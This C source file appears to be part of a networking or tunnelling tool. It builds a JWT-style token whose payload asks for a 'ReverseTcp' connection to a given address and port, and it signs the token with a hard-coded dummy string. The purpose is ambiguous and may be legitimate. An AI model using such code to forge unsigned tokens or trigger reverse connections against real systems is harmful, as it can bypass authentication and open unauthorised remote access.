#include "jwt.h"
#include <mbedtls/base64.h>
#include <string.h>
#include <stdio.h>

int base64url_encode(const unsigned char *in, size_t in_len,
                     char *out, size_t out_size)
{
    size_t olen;
    int ret = mbedtls_base64_encode((unsigned char *)out, out_size, &olen,
                                     in, in_len);
    if (ret != 0) return -1;

    for (size_t i = 0; i < olen; i++) {
        if (out[i] == '+') out[i] = '-';
        else if (out[i] == '/') out[i] = '_';
        else if (out[i] == '=') { out[i] = '\0'; break; }
    }
    return 0;
}

int jwt_encode_reverse_tcp(const char *bind_addr, int bind_port,
                           char *out, size_t out_size)
{
    char header_enc[128];
    char payload_enc[256];
    char payload_raw[256];

    int n = snprintf(payload_raw, sizeof(payload_raw),
        "{\"id\":\"%08x\",\"p\":\"ReverseTcp\",\"r\":\"%s\",\"rp\":%d}",
        0, bind_addr, bind_port);
    if (n < 0 || (size_t)n >= sizeof(payload_raw)) return -1;

    if (base64url_encode((const unsigned char *)
            "{\"typ\":\"JWT\",\"alg\":\"HS256\"}", 27,
            header_enc, sizeof(header_enc)) != 0)
        return -1;

    if (base64url_encode((const unsigned char *)payload_raw,
            strlen(payload_raw), payload_enc, sizeof(payload_enc)) != 0)
        return -1;

    n = snprintf(out, out_size, "%s.%s.ZHVtbXk", header_enc, payload_enc);
    if (n < 0 || (size_t)n >= out_size) return -1;

    return 0;
}
